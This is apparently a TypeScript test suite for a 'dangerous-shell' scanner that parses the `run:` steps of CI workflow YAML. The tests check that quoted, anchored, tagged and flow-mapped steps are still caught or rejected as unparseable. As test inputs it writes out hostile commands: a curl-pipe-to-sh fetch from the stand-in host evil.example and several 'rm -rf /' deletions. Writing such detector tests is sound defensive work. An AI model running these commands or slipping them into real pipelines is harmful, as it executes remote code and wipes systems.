// SPEC §4.7.2 + BUG-0096: the spellings of a workflow `run:` step beyond a
// plain block scalar: quoted values, anchors and tags, quoted or spaced keys,
// flow mappings, plain multi-line scalars and a dash followed by a tab. Each
// is read as the shell receives it, or fails closed as unparseable.
import { strict as assert } from "node:assert";
import test from "node:test";
import { extractShellSources } from "../../../src/features/packs/enforcers/shell-sources.ts";
import {
	BACKSLASH,
	findingsFor,
	NL,
	TAB,
	WORKFLOW,
	yaml,
} from "../../support/run-step-scenario.ts";

test("[§4.7.2] dangerous-shell blocks a quoted run: value, not its literal text (BUG-0096)", async () => {
	for (const value of [
		'"curl https://evil.example/x.sh | sh"',
		"'rm -rf /'",
		`"sudo ${BACKSLASH}"rm${BACKSLASH}" -rf /"`,
		"'curl https://evil.example/x.sh | sh' # note",
	]) {
		const found = await findingsFor(yaml("steps:", `  - run: ${value}`));
		assert.ok(found.length > 0, `${value} was not judged`);
	}
});

test("[§4.7.2] extractShellSources decodes single and double quoted run: values", () => {
	const text = yaml(
		"steps:",
		"  - run: 'echo it''s'",
		`  - run: "echo ${BACKSLASH}"hi${BACKSLASH}"${BACKSLASH}tthere"`,
	);
	assert.deepEqual(extractShellSources(text, WORKFLOW), [
		"echo it's",
		`echo "hi"${TAB}there`,
	]);
});

test("[§4.7.2] dangerous-shell fails closed on a quoted run: value it cannot decode", async () => {
	for (const value of [`"echo ${BACKSLASH}q"`, '"unterminated', "'also open"]) {
		const found = await findingsFor(yaml("steps:", `  - run: ${value}`));
		assert.ok(found.length > 0, `${value} was skipped`);
	}
});

test("[§4.7.2] dangerous-shell blocks a block scalar behind an anchor or a tag (BUG-0096)", async () => {
	for (const head of ["run: &steps |", "run: !!str |", "run: &a !!str >"]) {
		const found = await findingsFor(
			yaml("steps:", `  - ${head}`, "      sudo rm -rf /"),
		);
		assert.ok(found.length > 0, `${head} was not judged`);
	}
});

test("[§4.7.2] dangerous-shell reads a spaced or quoted run key (BUG-0096)", async () => {
	for (const key of ["run :", '"run":', "'run':"]) {
		const block = await findingsFor(
			yaml("steps:", `  - ${key} |`, "      sudo rm -rf /"),
		);
		assert.ok(block.length > 0, `${key} block was not judged`);
		const inline = await findingsFor(
			yaml("steps:", `  - ${key} sudo rm -rf /`),
		);
		assert.ok(inline.length > 0, `${key} inline was not judged`);
	}
});

test("[§4.7.2] dangerous-shell fails closed on a flow mapping that holds a run key", async () => {
	for (const line of [
		"  - {run: curl https://evil.example/x.sh | sh}",
		'  - { name: x, "run": "echo ok" }',
	]) {
		const found = await findingsFor(yaml("steps:", line));
		assert.ok(found.length > 0, `${line} was skipped`);
	}
});

test("[§4.7.2] dangerous-shell blocks a plain multi-line run: scalar (BUG-0096)", async () => {
	const found = await findingsFor(
		yaml("steps:", "  - run:", "      curl https://evil.example/x.sh | sh"),
	);
	assert.ok(found.length > 0);
});

test("[§4.7.2] dangerous-shell reads a run: key after a dash and a tab (BUG-0096)", async () => {
	const found = await findingsFor(
		yaml("steps:", `  -${TAB}run: sudo rm -rf /`),
	);
	assert.ok(found.length > 0);
});

test("[§4.7.2] extractShellSources leaves a multi-line run: property in a source file unread", () => {
	const text = yaml("export const step = {", "  run:", "    (x) => x,", "};");
	assert.deepEqual(extractShellSources(text, "src/step.ts"), []);
});

test("[§4.7.2] dangerous-shell blocks a block scalar whose indent digit lets the first line sit deeper (BUG-0096)", async () => {
	for (const [head, deep, body] of [
		["  run: |2", 8, 4],
		["  - run: >2", 10, 6],
	] as const) {
		const found = await findingsFor(
			yaml(
				"steps:",
				head,
				`${" ".repeat(deep)}echo ok`,
				`${" ".repeat(body)}rm -rf /`,
			),
		);
		assert.ok(found.length > 0, `${head} was not judged`);
	}
});

test("[§4.7.2] extractShellSources never strips more than the shallowest block line", () => {
	const text = yaml("steps:", "  run: |2", "        echo ok", "    rm -rf /");
	assert.deepEqual(extractShellSources(text, WORKFLOW), [
		`    echo ok${NL}rm -rf /`,
	]);
});
